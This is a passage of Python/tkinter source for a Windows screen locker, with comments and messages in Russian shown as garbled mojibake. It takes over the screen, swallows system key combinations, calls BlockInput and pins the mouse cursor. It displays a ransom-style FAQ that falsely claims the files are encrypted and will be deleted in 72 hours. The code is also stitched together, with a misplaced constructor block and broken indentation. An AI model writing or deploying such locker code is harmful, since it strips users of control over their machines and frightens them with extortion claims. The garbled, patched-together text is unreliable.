                time.sleep(1)
        
    def prevent_close(self, event=None):
        return "break"
        
    def intercept_ctrl_alt_del(self, event):
        return "break"
        
    def intercept_ctrl_shift_esc(self, event):
        return "break"
        
    def intercept_system_keys(self, event):
        return "break"
        
    def activate_secret_input(self, event=None):
        """–ê–∫—Ç–∏–≤–∏—Ä—É–µ–º —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –≤–≤–æ–¥"""
        if not self.secret_input_active:
            self.secret_input_active = True
            self.secret_input = ""
            
            # –°–æ–∑–¥–∞–µ–º –ø–æ–ª–µ –¥–ª—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –≤–≤–æ–¥–∞ (—Å–±–æ–∫—É)
            self.secret_input_label = tk.Label(
                self.root,
                text="–°–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥: ",
                font=("Arial", 16),
                fg="red",
                bg="black"
            )
            self.secret_input_label.place(x=50, y=200)
            
            self.secret_display = tk.Label(
                self.root,
                text="",
                font=("Arial", 16, "bold"),
                fg="green",
                bg="black"
            )
            self.secret_display.place(x=200, y=200)
            
            # –ú–µ–Ω—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∞–≤–∏—à –¥–ª—è —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –≤–≤–æ–¥–∞
            self.root.unbind("<Key>")
            self.root.bind("<Key>", self.handle_secret_input)
            
        return "break"
    
    def handle_secret_input(self, event):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–æ–¥–∞"""
        if event.char:
            self.secret_input += event.char
            self.secret_display.config(text="*" * len(self.secret_input))
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–¥
            if self.secret_input == self.real_secret_code:
                self.real_unlock()
            elif len(self.secret_input) >= len(self.real_secret_code):
                # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –µ—Å–ª–∏ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π
                self.secret_input = ""
                self.secret_display.config(text="")
                
        elif event.keysym == 'BackSpace':
            self.secret_input = self.secret_input[:-1]
            self.secret_display.config(text="*" * len(self.secret_input))
            
        return "break"
    
    def real_unlock(self):
        """–ù–∞—Å—Ç–æ—è—â–∞—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Å–∏—Å—Ç–µ–º—ã"""
        try:
            # –†–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º –≤–≤–æ–¥
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        
        # –°–æ–∑–¥–∞–µ–º –æ–∫–Ω–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º—ã
        restore_window = tk.Toplevel(self.root)
        restore_window.attributes('-fullscreen', True)
        restore_window.configure(bg='black')
        restore_window.attributes('-topmost', True)
        
        # –¢–µ–∫—Å—Ç –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
        restore_label = tk.Label(
            restore_window,
            text="–í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã...",
            font=("Arial", 36, "bold"),
            fg="white",
            bg="black"
        )
        restore_label.pack(pady=100)
        
        # –ü—Ä–æ—Å—Ç–æ–π —Ç–µ–∫—Å—Ç –≤–º–µ—Å—Ç–æ –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä–∞
        status_label = tk.Label(
            restore_window,
            text="–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!",
            font=("Arial", 24),
            fg="white",
            bg="black"
        )
        status_label.pack(pady=20)
        
        # –ù–µ–º–µ–¥–ª–µ–Ω–Ω–∞—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞
        def unlock():
            time.sleep(2)  # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –≤–∏–∑—É–∞–ª—å–Ω–æ–≥–æ —ç—Ñ—Ñ–µ–∫—Ç–∞
            restore_window.destroy()
            self.root.destroy()
            messagebox.showinfo("–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ", "–ö–æ–º–ø—å—é—Ç–µ—Ä —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!")
            sys.exit(0)
        
        threading.Thread(target=unlock, daemon=True).start()
    
    def handle_key_press(self, event):
        # –ö–ª–∞–≤–∏—à–∏ –¥–ª—è –∫—Ä–∞—à–∞
        if event.char and event.char.lower() in ['q', '–π']:
            
            return "break"
            
        # –í–≤–æ–¥ –±—É–∫–≤ –∏ —Ü–∏—Ñ—Ä –¥–ª—è –∫–æ–¥–∞
        if event.char and (event.char.isalnum() or event.char in ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')']):
            self.entered_code += event.char
            self.update_code_display()
            
            if len(self.entered_code) == len(self.secret_code):
                if self.entered_code == self.secret_code:
                    messagebox.showinfo("–ê–•–ê–•–ê–•–ê–ê–•–ê–•–ê–•–•", "—Å–∏—Å—Ç–µ–º–∞ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞")
                    exit(1)
            
                else:
                    self.entered_code = ""
                    self.update_code_display()
                    messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥!—Ç—ã –Ω–∏–∫–æ–≥–¥–∞ –æ—Ç—Å—é–¥–∞ –Ω–µ –≤—ã–π–¥–µ—à—å. –Ω–∏–∫–æ–≥–¥–∞.—Å–¥–µ—Å—å –Ω–µ—Ç —Å–µ–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–æ–¥–∞. —Ç–æ–ª—å–∫–æ ctrl+alt+shift+q")
            return "break"
        
        # –û—á–∏—Å—Ç–∫–∞ –∫–æ–¥–∞
        elif event.keysym == 'BackSpace':
            self.entered_code = self.entered_code[:-1]
            self.update_code_display()
            return "break"
            
        return "break"
            
    def update_code_display(self):
        self.code_label.config(text="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥: " + "*" * len(self.entered_code))
        
    def crash_app(self):
        # –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω—ã–π –∫—Ä–∞—à(–Ω–µ—Ç)
        messagebox.showerror("–Ω–µ-–∞")
        
    def safe_exit(self):
        # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤—ã—Ö–æ–¥
        try:
            hdddd = 87
        except:
            hddifunujcrheurneri = 8385638568
        finally:
            messagebox.showerror("HAHHAHHAHAHAH")
            exit()
            
    def run(self):
        try:
            self.root.mainloop()
        except:
            # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –æ—à–∏–±–∫–∞—Ö
            self.run()
            
    def timer_thread(self):
        # –ñ–¥–µ–º 72 —á–∞—Å–∞ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)
        time.sleep(72 * 60 * 60)
        # –ü–æ—Å–ª–µ 72 —á–∞—Å–æ–≤ –Ω–∏—á–µ–≥–æ –Ω–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç
        pass
        
    def open_faq(self):
        """–û—Ç–∫—Ä—ã–≤–∞–µ—Ç –æ–∫–Ω–æ —Å —á–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–º–∏ –≤–æ–ø—Ä–æ—Å–∞–º–∏"""
        faq_window = tk.Toplevel(self.root)
        faq_window.title("FAQ")
        faq_window.geometry("600x400")
        faq_window.configure(bg='black')
        faq_window.attributes('-topmost', True)
        
        # –ó–∞–≥–æ–ª–æ–≤–æ–∫
        title_label = tk.Label(
            faq_window,
            text="–ß–∞—Å—Ç–æ –ó–∞–¥–∞–≤–∞–µ–º—ã–µ –í–æ–ø—Ä–æ—Å—ã",
            font=("Arial", 24, "bold"),
            fg="white",
            bg="black"
        )
        title_label.pack(pady=20)
        
        # –í–æ–ø—Ä–æ—Å—ã –∏ –æ—Ç–≤–µ—Ç—ã
        faq_text = """
        –í: –ß—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ —Å –º–æ–∏–º –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º?
        –û: –í–∞—à –∫–æ–º–ø—å—é—Ç–µ—Ä –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω. 
        
        –í: –ö–∞–∫ –º–Ω–µ –≤–µ—Ä–Ω—É—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–≤–æ–∏–º —Ñ–∞–π–ª–∞–º?
        –û: –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–ª—é—á–∞ –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏, –≤—ã –¥–æ–ª–∂–Ω—ã –≤–≤–µ—Å—Ç–∏ —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥
        
        –í: –ú–æ–≥—É –ª–∏ —è —Å–∞–º —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –±–µ–∑ –∫–æ–¥–∞?
        –û: –ù–µ—Ç, –≤—ã –Ω–µ —Å–º–æ–∂–µ—Ç–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –±–µ–∑ –∫–æ–¥–∞.
        
        –í: –ß—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥–µ—Ç, –µ—Å–ª–∏ —è –Ω–µ –≤–≤–µ–¥—É —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥?
        –û: –ï—Å–ª–∏ –≤—ã –Ω–µ –≤–≤–µ–¥–µ—Ç–µ —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥ –≤ —Ç–µ—á–µ–Ω–∏–µ 72 —á–∞—Å–æ–≤, —Ñ–∞–π–ª—ã –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã.

        –í:–∫–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –∫–ª—é—á?
        –û:—Å–∞–º –Ω–µ –∑–Ω–∞—é.
        """
        
        # –¢–µ–∫—Å—Ç FAQ
        faq_label = tk.Label(
            faq_window,
            text=faq_text,
            font=("Arial", 12),
            fg="red",
            bg="black",
            justify="left"
        )
        faq_label.pack(pady=20)
        
        # –ö–Ω–æ–ø–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è
        close_button = tk.Button(
            faq_window,
            text="–ó–∞–∫—Ä—ã—Ç—å",
            font=("Arial", 16),
            command=faq_window.destroy
        )
        close_button.pack(pady=20)
 
# –°–æ–∑–¥–∞–µ–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
        self.create_widgets()
       
        # –ë–ª–æ–∫–∏—Ä—É–µ–º –º—ã—à—å –µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ win32api
        if WIN32_AVAILABLE:
            self.block_mouse_thread = threading.Thread(target=self.block_mouse)
            self.block_mouse_thread.daemon = True
            self.block_mouse_thread.start()
       
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
        self.check_processes()
       
        # –ó–∞–ø—É—Å–∫–∞–µ–º Tkinter
        self.root.mainloop()
   
    def create_widgets(self):
        # –°–æ–æ–±—â–µ–Ω–∏–µ –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ
        message_label = tk.Label(
            self.root,
            text="–í–ê–® –ö–û–ú–ü–¨–Æ–¢–ï–† –ë–´–õ –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù!\n\n–î–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥.–¥–ª—è –¥–æ–ø –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ FAQ.",
            font=("Arial", 24, "bold"),
            fg="red",
            bg="black",
            justify=tk.CENTER
        )
        message_label.pack(expand=True)
       
        # –¢–∞–π–º–µ—Ä (–¥–ª—è –≤–∏–¥–∏–º–æ—Å—Ç–∏)
        self.timer_label = tk.Label(
            self.root,
            text="",
            font=("Arial", 18),
            fg="red",
            bg="black"
        )
        self.timer_label.pack(pady=20)
       
        # –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–π–º–µ—Ä
        self.update_timer()
   
    def update_timer(self):
        if self.running:
            current_time = time.strftime("%H:%M:%S")
            self.timer_label.config(text=f"–í—Ä–µ–º—è: {current_time}")
            self.root.after(1000, self.update_timer)
   
    def block_mouse(self):
        while self.running:
            try:
                # –ë–ª–æ–∫–∏—Ä—É–µ–º –º—ã—à—å –≤ —Ü–µ–Ω—Ç—Ä–µ —ç–∫—Ä–∞–Ω–∞
                if WIN32_AVAILABLE:
                    win32api.SetCursorPos(
                        (self.root.winfo_screenwidth() // 2,
                         self.root.winfo_screenheight() // 2)
                    )
                time.sleep(0.1)
            except:
                pass
   
    def check_processes(self):
        print("bar")
    
       
               
           
       
   
    def on_closing(self):
        # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –ø–æ–ø—ã—Ç–∫–∏ –∑–∞–∫—Ä—ã—Ç–∏—è
        messagebox.showwarning("–û—à–∏–±–∫–∞", "–ó–∞–∫—Ä—ã—Ç–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ!")
   
    def destroy(self):
        self.running = False
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        self.root.quit()

# –ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
if __name__ == "__main__":
    app = UnclosableApp()
    # –í–µ—à–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞ –ø–æ–ø—ã—Ç–∫—É –∑–∞–∫—Ä—ã—Ç–∏—è
    app.root.protocol("WM_DELETE_WINDOW", app.on_closing)
    app.root.mainloop()
    app.block_mouse()
    time.sleep(10)
    exit(0)


–∑–≤—É–∫–∏(–æ–ø–∏—Å–∞–Ω–∏–µ):
win8bit.mp3:
8 –±–∏—Ç–Ω–∞—è –ø–æ–±–µ–¥–∞. –≤—Å–µ–≥–æ 2 —Å–µ–∫—É–Ω–¥—ã!

gameover.mp3:
—Ä–µ—Ç—Ä–æ —Å—Ç–∏–ª—å(8 –±–∏—Ç) –ø—Ä–æ–∏–≥—Ä—ã—à–∞ -4 —Å–µ–∫—É–Ω–¥—ã.
gimnrussia.mp3:
–≥–∏–º–Ω —Ä–æ—Å—Å–∏–∏


